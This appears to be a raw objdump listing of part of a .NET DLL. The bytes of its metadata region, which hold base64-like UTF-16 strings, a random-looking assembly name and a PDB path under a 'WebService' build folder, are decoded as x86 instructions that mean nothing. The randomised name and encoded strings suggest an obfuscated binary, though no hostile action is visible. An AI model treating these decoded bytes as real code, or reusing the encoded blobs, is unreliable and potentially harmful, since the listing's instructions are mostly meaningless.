10004b7d:	00 54 00 55          	add    %dl,0x55(%eax,%eax,1)
10004b81:	00 70 00             	add    %dh,0x0(%eax)
10004b84:	56                   	push   %esi
10004b85:	00 65 00             	add    %ah,0x0(%ebp)
10004b88:	6e                   	outsb  %ds:(%esi),(%dx)
10004b89:	00 68 00             	add    %ch,0x0(%eax)
10004b8c:	47                   	inc    %edi
10004b8d:	00 52 00             	add    %dl,0x0(%edx)
10004b90:	54                   	push   %esp
10004b91:	00 68 00             	add    %ch,0x0(%eax)
10004b94:	58                   	pop    %eax
10004b95:	00 55 00             	add    %dl,0x0(%ebp)
10004b98:	31 00                	xor    %eax,(%eax)
10004b9a:	4e                   	dec    %esi
10004b9b:	00 4b 00             	add    %cl,0x0(%ebx)
10004b9e:	56                   	push   %esi
10004b9f:	00 58 00             	add    %bl,0x0(%eax)
10004ba2:	70 00                	jo     0x10004ba4
10004ba4:	34 00                	xor    $0x0,%al
10004ba6:	52                   	push   %edx
10004ba7:	00 6b 00             	add    %ch,0x0(%ebx)
10004baa:	55                   	push   %ebp
10004bab:	00 34 00             	add    %dh,(%eax,%eax,1)
10004bae:	56                   	push   %esi
10004baf:	00 31                	add    %dh,(%ecx)
10004bb1:	00 4e 00             	add    %cl,0x0(%esi)
10004bb4:	54                   	push   %esp
10004bb5:	00 51 00             	add    %dl,0x0(%ecx)
10004bb8:	7a 00                	jp     0x10004bba
10004bba:	52                   	push   %edx
10004bbb:	00 36                	add    %dh,(%esi)
10004bbd:	00 53 00             	add    %dl,0x0(%ebx)
10004bc0:	6c                   	insb   (%dx),%es:(%edi)
10004bc1:	00 56 00             	add    %dl,0x0(%esi)
10004bc4:	36 00 65 00          	add    %ah,%ss:0x0(%ebp)
10004bc8:	45                   	inc    %ebp
10004bc9:	00 5a 00             	add    %bl,0x0(%edx)
10004bcc:	46                   	inc    %esi
10004bcd:	00 4f 00             	add    %cl,0x0(%edi)
10004bd0:	46                   	inc    %esi
10004bd1:	00 64 00 54          	add    %ah,0x54(%eax,%eax,1)
10004bd5:	00 55 00             	add    %dl,0x0(%ebp)
10004bd8:	30 00                	xor    %al,(%eax)
10004bda:	70 00                	jo     0x10004bdc
10004bdc:	56                   	push   %esi
10004bdd:	00 65 00             	add    %ah,0x0(%ebp)
10004be0:	6e                   	outsb  %ds:(%esi),(%dx)
10004be1:	00 68 00             	add    %ch,0x0(%eax)
10004be4:	47                   	inc    %edi
10004be5:	00 52 00             	add    %dl,0x0(%edx)
10004be8:	54                   	push   %esp
10004be9:	00 68 00             	add    %ch,0x0(%eax)
10004bec:	58                   	pop    %eax
10004bed:	00 55 00             	add    %dl,0x0(%ebp)
10004bf0:	31 00                	xor    %eax,(%eax)
10004bf2:	4e                   	dec    %esi
10004bf3:	00 4e 00             	add    %cl,0x0(%esi)
10004bf6:	52                   	push   %edx
10004bf7:	00 45 00             	add    %al,0x0(%ebp)
10004bfa:	31 00                	xor    %eax,(%eax)
10004bfc:	4b                   	dec    %ebx
10004bfd:	00 56 00             	add    %dl,0x0(%esi)
10004c00:	58                   	pop    %eax
10004c01:	00 70 00             	add    %dh,0x0(%eax)
10004c04:	34 00                	xor    $0x0,%al
10004c06:	52                   	push   %edx
10004c07:	00 6b 00             	add    %ch,0x0(%ebx)
10004c0a:	55                   	push   %ebp
10004c0b:	00 34 00             	add    %dh,(%eax,%eax,1)
10004c0e:	56                   	push   %esi
10004c0f:	00 31                	add    %dh,(%ecx)
10004c11:	00 4e 00             	add    %cl,0x0(%esi)
10004c14:	54                   	push   %esp
10004c15:	00 53 00             	add    %dl,0x0(%ebx)
10004c18:	6c                   	insb   (%dx),%es:(%edi)
10004c19:	00 56 00             	add    %dl,0x0(%esi)
10004c1c:	36 00 65 00          	add    %ah,%ss:0x0(%ebp)
10004c20:	45                   	inc    %ebp
10004c21:	00 5a 00             	add    %bl,0x0(%edx)
10004c24:	46                   	inc    %esi
10004c25:	00 4f 00             	add    %cl,0x0(%edi)
10004c28:	46                   	inc    %esi
10004c29:	00 64 00 54          	add    %ah,0x54(%eax,%eax,1)
10004c2d:	00 55 00             	add    %dl,0x0(%ebp)
10004c30:	33 00                	xor    (%eax),%eax
10004c32:	68 00 50 00 56       	push   $0x56005000
10004c37:	00 6b 00             	add    %ch,0x0(%ebx)
10004c3a:	70 00                	jo     0x10004c3c
10004c3c:	56                   	push   %esi
10004c3d:	00 65 00             	add    %ah,0x0(%ebp)
10004c40:	6e                   	outsb  %ds:(%esi),(%dx)
10004c41:	00 68 00             	add    %ch,0x0(%eax)
10004c44:	47                   	inc    %edi
10004c45:	00 52 00             	add    %dl,0x0(%edx)
10004c48:	54                   	push   %esp
10004c49:	00 68 00             	add    %ch,0x0(%eax)
10004c4c:	58                   	pop    %eax
10004c4d:	00 55 00             	add    %dl,0x0(%ebp)
10004c50:	31 00                	xor    %eax,(%eax)
10004c52:	4e                   	dec    %esi
10004c53:	00 4b 00             	add    %cl,0x0(%ebx)
10004c56:	56                   	push   %esi
10004c57:	00 58 00             	add    %bl,0x0(%eax)
10004c5a:	70 00                	jo     0x10004c5c
10004c5c:	34 00                	xor    $0x0,%al
10004c5e:	52                   	push   %edx
10004c5f:	00 6b 00             	add    %ch,0x0(%ebx)
10004c62:	55                   	push   %ebp
10004c63:	00 34 00             	add    %dh,(%eax,%eax,1)
10004c66:	56                   	push   %esi
10004c67:	00 31                	add    %dh,(%ecx)
10004c69:	00 4e 00             	add    %cl,0x0(%esi)
10004c6c:	54                   	push   %esp
10004c6d:	00 65 00             	add    %ah,0x0(%ebp)
10004c70:	47                   	inc    %edi
10004c71:	00 4e 00             	add    %cl,0x0(%esi)
10004c74:	4b                   	dec    %ebx
10004c75:	00 56 00             	add    %dl,0x0(%esi)
10004c78:	58                   	pop    %eax
10004c79:	00 70 00             	add    %dh,0x0(%eax)
10004c7c:	34 00                	xor    $0x0,%al
10004c7e:	52                   	push   %edx
10004c7f:	00 6b 00             	add    %ch,0x0(%ebx)
10004c82:	55                   	push   %ebp
10004c83:	00 34 00             	add    %dh,(%eax,%eax,1)
10004c86:	56                   	push   %esi
10004c87:	00 31                	add    %dh,(%ecx)
10004c89:	00 4e 00             	add    %cl,0x0(%esi)
10004c8c:	54                   	push   %esp
10004c8d:	00 00                	add    %al,(%eax)
10004c8f:	15 4a 00 55 00       	adc    $0x55004a,%eax
10004c94:	7a 00                	jp     0x10004c96
10004c96:	78 00                	js     0x10004c98
10004c98:	46                   	inc    %esi
10004c99:	00 45 00             	add    %al,0x0(%ebp)
10004c9c:	38 00                	cmp    %al,(%eax)
10004c9e:	57                   	push   %edi
10004c9f:	00 53 00             	add    %dl,0x0(%ebx)
10004ca2:	53                   	push   %ebx
10004ca3:	00 00                	add    %al,(%eax)
10004ca5:	80 b9 53 00 6c 00 63 	cmpb   $0x63,0x6c0053(%ecx)
10004cac:	00 31                	add    %dh,(%ecx)
10004cae:	00 51 00             	add    %dl,0x0(%ecx)
10004cb1:	31 00                	xor    %eax,(%eax)
10004cb3:	70 00                	jo     0x10004cb5
10004cb5:	45                   	inc    %ebp
10004cb6:	00 59 00             	add    %bl,0x0(%ecx)
10004cb9:	58                   	pop    %eax
10004cba:	00 56 00             	add    %dl,0x0(%esi)
10004cbd:	30 00                	xor    %al,(%eax)
10004cbf:	4d                   	dec    %ebp
10004cc0:	00 45 00             	add    %al,0x0(%ebp)
10004cc3:	74 00                	je     0x10004cc5
10004cc5:	70 00                	jo     0x10004cc7
10004cc7:	4e                   	dec    %esi
10004cc8:	00 55 00             	add    %dl,0x0(%ebp)
10004ccb:	70 00                	jo     0x10004ccd
10004ccd:	58                   	pop    %eax
10004cce:	00 4e 00             	add    %cl,0x0(%esi)
10004cd1:	55                   	push   %ebp
10004cd2:	00 4e 00             	add    %cl,0x0(%esi)
10004cd5:	61                   	popa
10004cd6:	00 52 00             	add    %dl,0x0(%edx)
10004cd9:	47                   	inc    %edi
10004cda:	00 46 00             	add    %al,0x0(%esi)
10004cdd:	31 00                	xor    %eax,(%eax)
10004cdf:	64 00 44 00 42       	add    %al,%fs:0x42(%eax,%eax,1)
10004ce4:	00 4b 00             	add    %cl,0x0(%ebx)
10004ce7:	56                   	push   %esi
10004ce8:	00 7a 00             	add    %bh,0x0(%edx)
10004ceb:	56                   	push   %esi
10004cec:	00 44 00 57          	add    %al,0x57(%eax,%eax,1)
10004cf0:	00 6b 00             	add    %ch,0x0(%ebx)
10004cf3:	52                   	push   %edx
10004cf4:	00 68 00             	add    %ch,0x0(%eax)
10004cf7:	64 00 58 00          	add    %bl,%fs:0x0(%eax)
10004cfb:	51                   	push   %ecx
10004cfc:	00 77 00             	add    %dh,0x0(%edi)
10004cff:	62 00                	bound  %eax,(%eax)
10004d01:	47                   	inc    %edi
10004d02:	00 56 00             	add    %dl,0x0(%esi)
10004d05:	48                   	dec    %eax
10004d06:	00 53 00             	add    %dl,0x0(%ebx)
10004d09:	6c                   	insb   (%dx),%es:(%edi)
10004d0a:	00 63 00             	add    %ah,0x0(%ebx)
10004d0d:	31 00                	xor    %eax,(%eax)
10004d0f:	51                   	push   %ecx
10004d10:	00 31                	add    %dh,(%ecx)
10004d12:	00 70 00             	add    %dh,0x0(%eax)
10004d15:	45                   	inc    %ebp
10004d16:	00 59 00             	add    %bl,0x0(%ecx)
10004d19:	58                   	pop    %eax
10004d1a:	00 56 00             	add    %dl,0x0(%esi)
10004d1d:	30 00                	xor    %al,(%eax)
10004d1f:	4d                   	dec    %ebp
10004d20:	00 45 00             	add    %al,0x0(%ebp)
10004d23:	70 00                	jo     0x10004d25
10004d25:	58                   	pop    %eax
10004d26:	00 4e 00             	add    %cl,0x0(%esi)
10004d29:	55                   	push   %ebp
10004d2a:	00 4e 00             	add    %cl,0x0(%esi)
10004d2d:	61                   	popa
10004d2e:	00 52 00             	add    %dl,0x0(%edx)
10004d31:	47                   	inc    %edi
10004d32:	00 46 00             	add    %al,0x0(%esi)
10004d35:	31 00                	xor    %eax,(%eax)
10004d37:	64 00 44 00 42       	add    %al,%fs:0x42(%eax,%eax,1)
10004d3c:	00 56 00             	add    %dl,0x0(%esi)
10004d3f:	50                   	push   %eax
10004d40:	00 55 00             	add    %dl,0x0(%ebp)
10004d43:	70 00                	jo     0x10004d45
10004d45:	58                   	pop    %eax
10004d46:	00 4e 00             	add    %cl,0x0(%esi)
10004d49:	55                   	push   %ebp
10004d4a:	00 4e 00             	add    %cl,0x0(%esi)
10004d4d:	61                   	popa
10004d4e:	00 52 00             	add    %dl,0x0(%edx)
10004d51:	47                   	inc    %edi
10004d52:	00 46 00             	add    %al,0x0(%esi)
10004d55:	31 00                	xor    %eax,(%eax)
10004d57:	64 00 44 00 41       	add    %al,%fs:0x41(%eax,%eax,1)
10004d5c:	00 3d 00 00 15 4a    	add    %bh,0x4a150000
10004d62:	00 57 00             	add    %dl,0x0(%edi)
10004d65:	35 00 43 00 5a       	xor    $0x5a004300,%eax
10004d6a:	00 44 00 61          	add    %al,0x61(%eax,%eax,1)
10004d6e:	00 75 00             	add    %dh,0x0(%ebp)
10004d71:	74 00                	je     0x10004d73
10004d73:	30 00                	xor    %al,(%eax)
10004d75:	00 00                	add    %al,(%eax)
10004d77:	00 04 21             	add    %al,(%ecx,%eiz,1)
10004d7a:	0b 7c 2d c0          	or     -0x40(%ebp,%ebp,1),%edi
10004d7e:	24 41                	and    $0x41,%al
10004d80:	80 5b ca df          	sbbb   $0xdf,-0x36(%ebx)
10004d84:	78 ae                	js     0x10004d34
10004d86:	33 08                	xor    (%eax),%ecx
10004d88:	00 04 20             	add    %al,(%eax,%eiz,1)
10004d8b:	01 01                	add    %eax,(%ecx)
10004d8d:	08 03                	or     %al,(%ebx)
10004d8f:	20 00                	and    %al,(%eax)
10004d91:	01 05 20 01 01 11    	add    %eax,0x11010120
10004d97:	11 04 20             	adc    %eax,(%eax,%eiz,1)
10004d9a:	01 01                	add    %eax,(%ecx)
10004d9c:	0e                   	push   %cs
10004d9d:	04 20                	add    $0x20,%al
10004d9f:	01 01                	add    %eax,(%ecx)
10004da1:	02 0c 07             	add    (%edi,%eax,1),%cl
10004da4:	07                   	pop    %es
10004da5:	11 0c 11             	adc    %ecx,(%ecx,%edx,1)
10004da8:	10 18                	adc    %bl,(%eax)
10004daa:	18 18                	sbb    %bl,(%eax)
10004dac:	12 45 09             	adc    0x9(%ebp),%al
10004daf:	06                   	push   %es
10004db0:	10 01                	adc    %al,(%ecx)
10004db2:	01 08                	add    %ecx,(%eax)
10004db4:	1e                   	push   %ds
10004db5:	00 04 0a             	add    %al,(%edx,%ecx,1)
10004db8:	01 11                	add    %edx,(%ecx)
10004dba:	0c 02                	or     $0x2,%al
10004dbc:	06                   	push   %es
10004dbd:	18 05 00 02 02 18    	sbb    %al,0x18020200
10004dc3:	18 04 00             	sbb    %al,(%eax,%eax,1)
10004dc6:	00 12                	add    %dl,(%edx)
10004dc8:	61                   	popa
10004dc9:	05 00 01 1d 05       	add    $0x51d0100,%eax
10004dce:	0e                   	push   %cs
10004dcf:	05 20 01 0e 1d       	add    $0x1d0e0120,%eax
10004dd4:	05 05 20 02 0e       	add    $0xe022005,%eax
10004dd9:	0e                   	push   %cs
10004dda:	0e                   	push   %cs
10004ddb:	04 00                	add    $0x0,%al
10004ddd:	01 01                	add    %eax,(%ecx)
10004ddf:	08 05 00 01 12 45    	or     %al,0x45120100
10004de5:	08 03                	or     %al,(%ebx)
10004de7:	20 00                	and    %al,(%eax)
10004de9:	02 06                	add    (%esi),%al
10004deb:	07                   	pop    %es
10004dec:	02 12                	add    (%edx),%dl
10004dee:	14 1d                	adc    $0x1d,%al
10004df0:	0e                   	push   %cs
10004df1:	05 15 12 55 01       	add    $0x1551215,%eax
10004df6:	0e                   	push   %cs
10004df7:	05 20 01 01 13       	add    $0x13010120,%eax
10004dfc:	00 08                	add    %cl,(%eax)
10004dfe:	00 03                	add    %al,(%ebx)
10004e00:	1d 0e 0e 0e 11       	sbb    $0x110e0e0e,%eax
10004e05:	75 06                	jne    0x10004e0d
10004e07:	15 12 79 02 0e       	adc    $0xe027912,%eax
10004e0c:	02 05 20 02 01 1c    	add    0x1c010220,%al
10004e12:	18 18                	sbb    %bl,(%eax)
10004e14:	10 01                	adc    %al,(%ecx)
10004e16:	02 15 12 80 81 01    	add    0x1818012,%dl
10004e1c:	1e                   	push   %ds
10004e1d:	00 15 12 80 81 01    	add    %dl,0x1818012
10004e23:	1e                   	push   %ds
10004e24:	00 15 12 79 02 1e    	add    %dl,0x1e027912
10004e2a:	00 02                	add    %al,(%edx)
10004e2c:	03 0a                	add    (%edx),%ecx
10004e2e:	01 0e                	add    %ecx,(%esi)
10004e30:	0d 10 01 01 1d       	or     $0x1d010110,%eax
10004e35:	1e                   	push   %ds
10004e36:	00 15 12 80 81 01    	add    %dl,0x1818012
10004e3c:	1e                   	push   %ds
10004e3d:	00 04 20             	add    %al,(%eax,%eiz,1)
10004e40:	01 08                	add    %ecx,(%eax)
10004e42:	08 04 00             	or     %al,(%eax,%eax,1)
10004e45:	01 0e                	add    %ecx,(%esi)
10004e47:	0e                   	push   %cs
10004e48:	05 20 01 02 13       	add    $0x13020120,%eax
10004e4d:	00 08                	add    %cl,(%eax)
10004e4f:	b7 7a                	mov    $0x7a,%bh
10004e51:	5c                   	pop    %esp
10004e52:	56                   	push   %esi
10004e53:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
10004e56:	89 02                	mov    %eax,(%edx)
10004e58:	06                   	push   %es
10004e59:	09 02                	or     %eax,(%edx)
10004e5b:	06                   	push   %es
10004e5c:	0e                   	push   %cs
10004e5d:	02 06                	add    (%esi),%al
10004e5f:	08 02                	or     %al,(%edx)
10004e61:	06                   	push   %es
10004e62:	06                   	push   %es
10004e63:	06                   	push   %es
10004e64:	06                   	push   %es
10004e65:	15 12 55 01 0e       	adc    $0xe015512,%eax
10004e6a:	11 00                	adc    %eax,(%eax)
10004e6c:	0a 02                	or     (%edx),%al
10004e6e:	0e                   	push   %cs
10004e6f:	0e                   	push   %cs
10004e70:	18 18                	sbb    %bl,(%eax)
10004e72:	02 09                	add    (%ecx),%cl
10004e74:	18 0e                	sbb    %cl,(%esi)
10004e76:	10 11                	adc    %dl,(%ecx)
10004e78:	0c 10                	or     $0x10,%al
10004e7a:	11 10                	adc    %edx,(%eax)
10004e7c:	06                   	push   %es
10004e7d:	00 02                	add    %al,(%edx)
10004e7f:	02 18                	add    (%eax),%bl
10004e81:	10 09                	adc    %cl,(%ecx)
10004e83:	0a 00                	or     (%eax),%al
10004e85:	05 02 18 18 1d       	add    $0x1d181802,%eax
10004e8a:	05 09 10 18 06       	add    $0x6181009,%eax
10004e8f:	00 02                	add    %al,(%edx)
10004e91:	01 0e                	add    %ecx,(%esi)
10004e93:	1d 05 04 00 01       	sbb    $0x1000405,%eax
10004e98:	02 18                	add    (%eax),%bl
10004e9a:	0b 00                	or     (%eax),%eax
10004e9c:	07                   	pop    %es
10004e9d:	18 18                	sbb    %bl,(%eax)
10004e9f:	18 09                	sbb    %cl,(%ecx)
10004ea1:	18 18                	sbb    %bl,(%eax)
10004ea3:	09 10                	or     %edx,(%eax)
10004ea5:	18 08                	sbb    %cl,(%eax)
10004ea7:	00 05 18 18 18 09    	add    %al,0x9181818
10004ead:	09 09                	or     %ecx,(%ecx)
10004eaf:	03 00                	add    (%eax),%eax
10004eb1:	00 0e                	add    %cl,(%esi)
10004eb3:	04 20                	add    $0x20,%al
10004eb5:	01 02                	add    %eax,(%edx)
10004eb7:	0e                   	push   %cs
10004eb8:	08 01                	or     %al,(%ecx)
10004eba:	00 08                	add    %cl,(%eax)
10004ebc:	00 00                	add    %al,(%eax)
10004ebe:	00 00                	add    %al,(%eax)
10004ec0:	00 1e                	add    %bl,(%esi)
10004ec2:	01 00                	add    %eax,(%eax)
10004ec4:	01 00                	add    %eax,(%eax)
10004ec6:	54                   	push   %esp
10004ec7:	02 16                	add    (%esi),%dl
10004ec9:	57                   	push   %edi
10004eca:	72 61                	jb     0x10004f2d
10004ecc:	70 4e                	jo     0x10004f1c
10004ece:	6f                   	outsl  %ds:(%esi),(%dx)
10004ecf:	6e                   	outsb  %ds:(%esi),(%dx)
10004ed0:	45                   	inc    %ebp
10004ed1:	78 63                	js     0x10004f36
10004ed3:	65 70 74             	gs jo  0x10004f4a
10004ed6:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
10004edd:	77 73                	ja     0x10004f52
10004edf:	01 08                	add    %ecx,(%eax)
10004ee1:	01 00                	add    %eax,(%eax)
10004ee3:	02 00                	add    (%eax),%al
10004ee5:	00 00                	add    %al,(%eax)
10004ee7:	00 00                	add    %al,(%eax)
10004ee9:	13 01                	adc    (%ecx),%eax
10004eeb:	00 0e                	add    %cl,(%esi)
10004eed:	4f                   	dec    %edi
10004eee:	58                   	pop    %eax
10004eef:	77 50                	ja     0x10004f41
10004ef1:	6e                   	outsb  %ds:(%esi),(%dx)
10004ef2:	4f                   	dec    %edi
10004ef3:	4a                   	dec    %edx
10004ef4:	35 4f 72 46 52       	xor    $0x5246724f,%eax
10004ef9:	4a                   	dec    %edx
10004efa:	49                   	dec    %ecx
10004efb:	00 00                	add    %al,(%eax)
10004efd:	05 01 00 00 00       	add    $0x1,%eax
10004f02:	00 17                	add    %dl,(%edi)
10004f04:	01 00                	add    %eax,(%eax)
10004f06:	12 43 6f             	adc    0x6f(%ebx),%al
10004f09:	70 79                	jo     0x10004f84
10004f0b:	72 69                	jb     0x10004f76
10004f0d:	67 68 74 20 c2 a9    	addr16 push $0xa9c22074
10004f13:	20 20                	and    %ah,(%eax)
10004f15:	32 30                	xor    (%eax),%dh
10004f17:	32 34 00             	xor    (%eax,%eax,1),%dh
10004f1a:	00 29                	add    %ch,(%ecx)
10004f1c:	01 00                	add    %eax,(%eax)
10004f1e:	24 32                	and    $0x32,%al
10004f20:	38 34 38             	cmp    %dh,(%eax,%edi,1)
10004f23:	44                   	inc    %esp
10004f24:	34 39                	xor    $0x39,%al
10004f26:	39 2d 46 46 39 43    	cmp    %ebp,0x43394646
10004f2c:	2d 34 37 32 30       	sub    $0x30323734,%eax
10004f31:	2d 38 42 32 34       	sub    $0x34324238,%eax
10004f36:	2d 38 39 42 43       	sub    $0x43423938,%eax
10004f3b:	45                   	inc    %ebp
10004f3c:	37                   	aaa
10004f3d:	42                   	inc    %edx
10004f3e:	34 43                	xor    $0x43,%al
10004f40:	42                   	inc    %edx
10004f41:	44                   	inc    %esp
10004f42:	37                   	aaa
10004f43:	00 00                	add    %al,(%eax)
10004f45:	0c 01                	or     $0x1,%al
10004f47:	00 07                	add    %al,(%edi)
10004f49:	31 2e                	xor    %ebp,(%esi)
10004f4b:	30 2e                	xor    %ch,(%esi)
10004f4d:	30 2e                	xor    %ch,(%esi)
10004f4f:	30 00                	xor    %al,(%eax)
10004f51:	00 49 01             	add    %cl,0x1(%ecx)
10004f54:	00 1a                	add    %bl,(%edx)
10004f56:	2e 4e                	cs dec %esi
10004f58:	45                   	inc    %ebp
10004f59:	54                   	push   %esp
10004f5a:	46                   	inc    %esi
10004f5b:	72 61                	jb     0x10004fbe
10004f5d:	6d                   	insl   (%dx),%es:(%edi)
10004f5e:	65 77 6f             	gs ja  0x10004fd0
10004f61:	72 6b                	jb     0x10004fce
10004f63:	2c 56                	sub    $0x56,%al
10004f65:	65 72 73             	gs jb  0x10004fdb
10004f68:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
10004f6f:	38 01                	cmp    %al,(%ecx)
10004f71:	00 54 0e 14          	add    %dl,0x14(%esi,%ecx,1)
10004f75:	46                   	inc    %esi
10004f76:	72 61                	jb     0x10004fd9
10004f78:	6d                   	insl   (%dx),%es:(%edi)
10004f79:	65 77 6f             	gs ja  0x10004feb
10004f7c:	72 6b                	jb     0x10004fe9
10004f7e:	44                   	inc    %esp
10004f7f:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
10004f86:	61                   	popa
10004f87:	6d                   	insl   (%dx),%es:(%edi)
10004f88:	65 12 2e             	adc    %gs:(%esi),%ch
10004f8b:	4e                   	dec    %esi
10004f8c:	45                   	inc    %ebp
10004f8d:	54                   	push   %esp
10004f8e:	20 46 72             	and    %al,0x72(%esi)
10004f91:	61                   	popa
10004f92:	6d                   	insl   (%dx),%es:(%edi)
10004f93:	65 77 6f             	gs ja  0x10005005
10004f96:	72 6b                	jb     0x10005003
10004f98:	20 34 2e             	and    %dh,(%esi,%ebp,1)
10004f9b:	38 04 01             	cmp    %al,(%ecx,%eax,1)
	...
10004fa6:	00 00                	add    %al,(%eax)
10004fa8:	1f                   	pop    %ds
10004fa9:	54                   	push   %esp
10004faa:	cf                   	iret
10004fab:	f1                   	int1
10004fac:	00 00                	add    %al,(%eax)
10004fae:	00 00                	add    %al,(%eax)
10004fb0:	02 00                	add    (%eax),%al
10004fb2:	00 00                	add    %al,(%eax)
10004fb4:	79 00                	jns    0x10004fb6
10004fb6:	00 00                	add    %al,(%eax)
10004fb8:	dc 4f 00             	fmull  0x0(%edi)
10004fbb:	00 dc                	add    %bl,%ah
10004fbd:	31 00                	xor    %eax,(%eax)
	...
10004fcb:	00 10                	add    %dl,(%eax)
	...
10004fd9:	00 00                	add    %al,(%eax)
10004fdb:	00 52 53             	add    %dl,0x53(%edx)
10004fde:	44                   	inc    %esp
10004fdf:	53                   	push   %ebx
10004fe0:	b9 39 00 3b 89       	mov    $0x893b0039,%ecx
10004fe5:	8a c2                	mov    %dl,%al
10004fe7:	4f                   	dec    %edi
10004fe8:	84 98 42 fe 08 95    	test   %bl,-0x6af701be(%eax)
10004fee:	74 ff                	je     0x10004fef
10004ff0:	01 00                	add    %eax,(%eax)
10004ff2:	00 00                	add    %al,(%eax)
10004ff4:	43                   	inc    %ebx
10004ff5:	3a 5c 55 73          	cmp    0x73(%ebp,%edx,2),%bl
10004ff9:	65 72 73             	gs jb  0x1000506f
10004ffc:	5c                   	pop    %esp
10004ffd:	77 6f                	ja     0x1000506e
10004fff:	72 6b                	jb     0x1000506c
10005001:	74 65                	je     0x10005068
10005003:	61                   	popa
10005004:	6d                   	insl   (%dx),%es:(%edi)
10005005:	5c                   	pop    %esp
10005006:	44                   	inc    %esp
10005007:	65 73 6b             	gs jae 0x10005075
1000500a:	74 6f                	je     0x1000507b
1000500c:	70 5c                	jo     0x1000506a
1000500e:	57                   	push   %edi
1000500f:	65 62 53 65          	bound  %edx,%gs:0x65(%ebx)
10005013:	72 76                	jb     0x1000508b
10005015:	69 63 65 5c 61 73 73 	imul   $0x7373615c,0x65(%ebx),%esp
1000501c:	65 74 73             	gs je  0x10005092
1000501f:	5c                   	pop    %esp
10005020:	62 69 6e             	bound  %ebp,0x6e(%ecx)
10005023:	5c                   	pop    %esp
10005024:	74 65                	je     0x1000508b
10005026:	6d                   	insl   (%dx),%es:(%edi)
10005027:	70 2d                	jo     0x10005056
10005029:	62 65 34             	bound  %esp,0x34(%ebp)
1000502c:	63 38                	arpl   %edi,(%eax)
1000502e:	31 37                	xor    %esi,(%edi)
10005030:	61                   	popa
10005031:	39 64 33 37          	cmp    %esp,0x37(%ebx,%esi,1)
10005035:	5c                   	pop    %esp
10005036:	6f                   	outsl  %ds:(%esi),(%dx)
10005037:	62 6a 5c             	bound  %ebp,0x5c(%edx)
1000503a:	52                   	push   %edx
1000503b:	65 6c                	gs insb (%dx),%es:(%edi)
1000503d:	65 61                	gs popa
1000503f:	73 65                	jae    0x100050a6
10005041:	5c                   	pop    %esp
10005042:	4f                   	dec    %edi
10005043:	58                   	pop    %eax
10005044:	77 50                	ja     0x10005096
10005046:	6e                   	outsb  %ds:(%esi),(%dx)
10005047:	4f                   	dec    %edi
10005048:	4a                   	dec    %edx
10005049:	35 4f 72 46 52       	xor    $0x5246724f,%eax
1000504e:	4a                   	dec    %edx
1000504f:	49                   	dec    %ecx
10005050:	2e 70 64             	jo,pn  0x100050b7
10005053:	62 00                	bound  %eax,(%eax)
10005055:	7d 50                	jge    0x100050a7
	...
1000505f:	00 00                	add    %al,(%eax)
10005061:	97                   	xchg   %eax,%edi
10005062:	50                   	push   %eax
10005063:	00 00                	add    %al,(%eax)
10005065:	00 20                	add    %ah,(%eax)
	...
1000507b:	00 00                	add    %al,(%eax)
1000507d:	89 50 00             	mov    %edx,0x0(%eax)
	...
10005088:	00 00                	add    %al,(%eax)
1000508a:	00 5f 43             	add    %bl,0x43(%edi)
1000508d:	6f                   	outsl  %ds:(%esi),(%dx)
1000508e:	72 44                	jb     0x100050d4
10005090:	6c                   	insb   (%dx),%es:(%edi)
10005091:	6c                   	insb   (%dx),%es:(%edi)
10005092:	4d                   	dec    %ebp
10005093:	61                   	popa
10005094:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
1000509b:	72 65                	jb     0x10005102
1000509d:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
100050a1:	6c                   	insb   (%dx),%es:(%edi)
	...
100050aa:	ff 25 00 20 00 10    	jmp    *0x10002000
